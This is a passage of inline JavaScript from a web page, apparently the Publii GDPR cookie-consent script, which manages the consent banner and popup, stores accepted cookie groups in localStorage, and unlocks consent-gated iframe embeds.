        cbUI.overlay.classList.remove('is-visible');
        cbUI.popup.element.setAttribute('aria-hidden', 'true');
        cbUI.overlay.setAttribute('aria-hidden', 'true');
    }

    function showBanner () {
        cbUI.banner.element.classList.add('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'false');
    }

    function hideBanner () {
        cbUI.banner.element.classList.remove('is-visible');
        cbUI.banner.element.setAttribute('aria-hidden', 'true');
    }

    function showBadge () {
        if (!cbUI.badge) {
            return;
        }

        cbUI.badge.classList.add('is-visible');
        cbUI.badge.setAttribute('aria-hidden', 'false');
    }

    function getConfigName () {
        var lsKeyName = 'publii-gdpr-allowed-cookies';

        if (cbConfig.revision) {
            lsKeyName = lsKeyName + '-v' + parseInt(cbConfig.revision, 10);
        }

        return lsKeyName;
    }

    function storeConfiguration (allowedGroups) {
        var lsKeyName = getConfigName();
        var dataToStore = allowedGroups.join(',');
        localStorage.setItem(lsKeyName, dataToStore);

        if (cbConfig.configTTL === 0) {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', 0);

            if (cbConfig.debugMode) {
                console.log('🍪 Store never expiring configuration');
            }
        } else {
            localStorage.setItem('publii-gdpr-cookies-config-save-date', +new Date());
        }
    }

    function getInitialStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Initial state: ' + groups.join(', '));
        }

        return groups;
    }

    function getCurrentStateOfConsents () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]:checked');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 State to save: ' + groups.join(', '));
        }

        return groups;
    }

    function getAllGroups () {
        if (!cbUI.popup.element) {
            return [];
        }

        var checkedGroups = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');
        var groups = [];

        for (var i = 0; i < checkedGroups.length; i++) {
            var allowedGroup = checkedGroups[i].getAttribute('data-group-name');

            if (allowedGroup !== '') {
                groups.push(allowedGroup);
            }
        }

        return groups;
    }

    function acceptAllCookies (source) {
        var groupsToAccept = getAllGroups();
        storeConfiguration(groupsToAccept);

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        if (cbUI.popup.element) {
            var checkboxesToCheck = cbUI.popup.element.querySelectorAll('input[type="checkbox"]');

            for (var j = 0; j < checkboxesToCheck.length; j++) {
                checkboxesToCheck[j].checked = true;
            }
        }

        if (cbConfig.debugMode) {
            console.log('🍪 Accept all cookies: ', groupsToAccept.join(', '));
        }

        if (source === 'popup') {
            hideAdvancedPopup();
        } else if (source === 'banner') {
            hideBanner();
        }
    }

    function rejectAllCookies () {
        if (cbConfig.debugMode) {
            console.log('🍪 Reject all cookies');
        }

        storeConfiguration([]);
        setTimeout(function () {
            window.location.reload();
        }, 100);
    }

    function saveConfiguration () {
        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }

        if (reloadIsNeeded(groupsToAccept)) {
            setTimeout(function () {
                window.location.reload();
            }, 100);
            return;
        }

        for (var i = 0; i < groupsToAccept.length; i++) {
            var group = groupsToAccept[i];

            if (cbConfig.initialState.indexOf(group) > -1 || cbConfig.previouslyAccepted.indexOf(group) > -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Skip previously activated group: ' + group);
                }

                continue;
            }

            allowCookieGroup(group);
        }

        hideAdvancedPopup();
    }

    function reloadIsNeeded (groupsToAccept) {
        // check if user rejected consent for initial groups
        var initialGroups = cbConfig.initialState;
        var previouslyAcceptedGroups = cbConfig.previouslyAccepted;
        var groupsToCheck = initialGroups.concat(previouslyAcceptedGroups);

        for (var i = 0; i < groupsToCheck.length; i++) {
            var groupToCheck = groupsToCheck[i];

            if (groupsToAccept.indexOf(groupToCheck) === -1) {
                if (cbConfig.debugMode) {
                    console.log('🍪 Reload is needed due lack of: ', groupToCheck);
                }

                return true;
            }
        }

        return false;
    }

    function unlockEmbeds (cookieGroup) {
        var iframesToUnlock = document.querySelectorAll('.pec-wrapper[data-consent-group-id="' + cookieGroup + '"]');

        for (var i = 0; i < iframesToUnlock.length; i++) {
            var iframeWrapper = iframesToUnlock[i];
            iframeWrapper.querySelector('.pec-overlay').classList.remove('is-active');
            iframeWrapper.querySelector('.pec-overlay').setAttribute('aria-hidden', 'true');
            var iframe = iframeWrapper.querySelector('iframe');
            iframe.setAttribute('src', iframe.getAttribute('data-consent-src'));
        }
    }

    win.publiiEmbedConsentGiven = function (cookieGroup) {
        // it will unlock embeds
        allowCookieGroup(cookieGroup);

        var checkbox = cbUI.popup.element.querySelector('input[type="checkbox"][data-group-name="' + cookieGroup + '"]');

        if (checkbox) {
            checkbox.checked = true;
        }

        var groupsToAccept = getCurrentStateOfConsents();
        storeConfiguration(groupsToAccept);

        if (cbConfig.debugMode) {
            console.log('🍪 Save new config: ', groupsToAccept.join(', '));
        }
    }
})(window);</script></body></html>